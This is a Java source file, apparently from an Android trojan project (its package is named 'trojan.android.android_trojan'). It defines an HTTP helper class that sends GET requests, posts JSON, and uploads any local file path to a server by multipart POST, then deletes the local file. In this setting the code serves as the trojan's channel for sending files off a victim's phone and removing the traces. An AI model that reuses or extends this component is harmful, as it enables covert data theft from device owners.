package trojan.android.android_trojan.Action;

import android.util.Log;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;


/**
 * Created by hoodlums on 18/03/15.
 */
public class HttpURLConnectionHelper implements IHttpURLConnection {
    final static String TAG = HttpURLConnectionHelper.class.getSimpleName();

    public String getHttp(URL url, String auth) {
        Log.d(TAG, "getHttp");
        String result = null;
        HttpURLConnection conn = null;

        try {
            conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("GET");
            if (auth != null)
                conn.setRequestProperty ("Authorization", auth);
            conn.setDoInput(true);
            conn.connect();

            if (conn.getResponseCode() == 200){
                result =  Tools.convertInputStreamToString(conn.getInputStream());
            }

        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, e.getMessage());
        }finally {
            if (conn != null) {
                conn.disconnect();
            }
            return result;
        }
    }

    public String postHttp(URL url, String data, String auth){
        File filee = new File(data);
        Log.d(TAG, String.valueOf(filee.exists()));
        if (filee.exists()){
            return postHttpFile(url, data, auth);
        }else {
            return postHttpJSON(url, data, auth);
        }
    }

    public String postHttpJSON(URL url, String json, String auth){
        Log.d(TAG, "postHttpJSON");
        String result = null;
        String urlParameters = json;
        HttpURLConnection conn = null;

        try {
            conn = (HttpsURLConnection) url.openConnection();
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("charset", "utf-8");
            conn.setRequestProperty("Accept", "application/json");
            if (auth != null)
                conn.setRequestProperty ("Authorization", auth);
            conn.setDoOutput(true);

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(urlParameters);
            wr.flush();
            wr.close();

            if (conn.getResponseCode() == 200){
                result =  Tools.convertInputStreamToString(conn.getInputStream());
            }

        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, e.getMessage());
        }finally {
            if (conn != null) {
                conn.disconnect();
            }
            return result;
        }
    }

    public String postHttpFile(URL url, String path, String auth){
        Log.d(TAG, "postHttpFile");
        File uploadFile = new File(path);
        String result = null;

        if (!uploadFile.exists())
            return result;

        HttpURLConnection conn = null;
        String BOUNDRY = "------------------------e5d0991ba211a5e1";
        String crlf = "\r\n";
        String twoHyphens = "--";

        try {
            // Make a connect to the server
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDRY);

            String contentDisposition = "Content-Disposition: form-data; name=\"filedata\"; filename=\""+uploadFile.getName()+"\"";
            String contentType = "Content-Type: application/octet-stream";

            DataOutputStream dataOS = new DataOutputStream(conn.getOutputStream());
            dataOS.write((twoHyphens + BOUNDRY + crlf).getBytes());
            dataOS.write(contentDisposition.getBytes());
            dataOS.write(crlf.getBytes());
            dataOS.write(contentType.getBytes());
            dataOS.write(crlf.getBytes());
            dataOS.write(crlf.getBytes());
            dataOS.write(Tools.convertFileToByteArray(uploadFile));
            dataOS.write(crlf.getBytes());
            dataOS.write((twoHyphens + BOUNDRY + twoHyphens + crlf).getBytes());
            dataOS.flush();
            dataOS.close();

            Log.d(TAG, String.valueOf(conn.getResponseCode()));
        }catch (Exception ex){
            Log.d(TAG, ex.getMessage());
        }finally {
            if (conn != null) {
                conn.disconnect();
                uploadFile.delete();
            }
        }

        return result;
    }


}
